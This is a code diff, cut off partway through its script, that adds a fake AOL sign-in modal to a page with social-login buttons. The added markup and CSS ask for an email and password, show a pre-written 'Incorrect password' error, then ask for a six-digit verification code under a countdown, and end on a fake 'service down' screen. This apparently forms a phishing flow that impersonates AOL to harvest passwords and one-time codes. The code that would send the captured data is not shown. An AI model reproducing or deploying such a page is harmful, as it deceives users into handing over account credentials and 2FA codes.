@@ -271,6 +271,132 @@
             font-style: italic;
             color: var(--gray);
         }
+
+        /* AOL Login Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-header img {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+
+        .modal-header h3 {
+            color: var(--dark-color);
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+        }
+
+        .modal-body {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .form-group label {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+
+        .form-group input {
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-family: 'Georgia', serif;
+            font-size: 1rem;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(74, 111, 165, 0.2);
+        }
+
+        .btn {
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            background: var(--primary-color);
+            color: white;
+            font-family: 'Georgia', serif;
+        }
+
+        .btn:hover {
+            background: var(--secondary-color);
+            transform: translateY(-2px);
+        }
+
+        .error {
+            color: var(--danger);
+            font-size: 0.9rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .otp-screen {
+            display: none;
+        }
+
+        .countdown {
+            text-align: center;
+            font-size: 1.2rem;
+            color: var(--danger);
+            margin: 20px 0;
+        }
+
+        .service-down {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            font-size: 1.2rem;
+            color: var(--dark-color);
+        }
+
+        .service-down h3 {
+            color: var(--danger);
+            margin-bottom: 10px;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
@@ -302,7 +428,7 @@
                 <div class="social-btn yahoo">
                     <i class="fab fa-yahoo"></i> Continue with Yahoo
                 </div>
-                <div class="social-btn aol">
+                <div class="social-btn aol" id="aol-login">
                     <i class="fab fa-aol"></i> Continue with AOL
                 </div>
                 <div class="social-btn other">
@@ -323,25 +449,59 @@
         </div>
     </div>
 
-    <script>
-        // Add interactivity to social login buttons
-        document.querySelectorAll('.social-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                alert(`Connecting with ${this.textContent.trim().replace('Continue with ', '')}...`);
-            });
-        });
+    <!-- AOL Login Modal -->
+    <div class="modal" id="aol-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/AOL_logo_2015.svg" alt="AOL Logo">
+                <h3>Sign in to your AOL account</h3>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="email">Email or username</label>
+                    <input type="text" id="email" placeholder="Enter your email or username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password">
+                </div>
+                <div class="error" id="error-message">Incorrect password. Please try again.</div>
+                <button class="btn" id="login-btn">Sign In</button>
+            </div>
+        </div>
+    </div>
 
-        // Add subtle animation to floral elements
-        document.addEventListener('DOMContentLoaded', function() {
-            const floralTop = document.querySelector('.floral-top');
-            const floralBottom = document.querySelector('.floral-bottom');
-            
-            // Simple floating animation
-            setInterval(() => {
-                floralTop.style.transform = `rotate(${Math.random() * 2 - 1}deg)`;
-                floralBottom.style.transform = `rotate(${Math.random() * 2 - 1}deg)`;
-            }, 3000);
-        });
-    </script>
-</body>
-</html>
+    <!-- OTP Screen -->
+    <div class="modal" id="otp-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/AOL_logo_2015.svg" alt="AOL Logo">
+                <h3>Enter your verification code</h3>
+            </div>
+            <div class="modal-body">
+                <p>We've sent a 6-digit code to your email. Enter it below.</p>
+                <div class="form-group">
+                    <label for="otp">Verification code</label>
+                    <input type="text" id="otp" placeholder="Enter 6-digit code" maxlength="6">
+                </div>
+                <div class="countdown" id="countdown">Time remaining: <span id="timer">5:00</span></div>
+                <button class="btn" id="otp-btn">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Service Down Screen -->
+    <div class="modal" id="service-down-modal">
+        <div class="modal-content">
+            <div class="service-down">
+                <h3>⚠️ Service Temporarily Unavailable</h3>
+                <p>Please try again later. Our service is down for maintenance.</p>
+                <button class="btn" id="try-again-btn">Try Again</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get DOM elements
+        const aolLoginBtn = document.getElementById('aol-login');
+        const aol
